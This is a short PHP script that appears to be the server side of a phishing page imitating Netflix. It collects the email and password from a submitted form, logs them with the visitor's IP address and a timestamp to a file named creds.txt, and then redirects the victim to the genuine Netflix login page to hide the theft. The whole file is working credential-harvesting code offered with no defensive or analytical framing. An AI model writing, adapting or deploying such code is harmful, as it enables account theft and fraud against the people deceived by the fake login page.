<?php
function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $ip = get_client_ip();
    $time = date("Y-m-d H:i:s");

    $logEntry = "[$time] IP: $ip | Email: $email | Password: $password\n";

    file_put_contents("creds.txt", $logEntry, FILE_APPEND | LOCK_EX);

    header("Location: https://www.netflix.com/login");
    exit();
} else {
    http_response_code(403);
    echo "403 Forbidden";
    exit();
}
?>
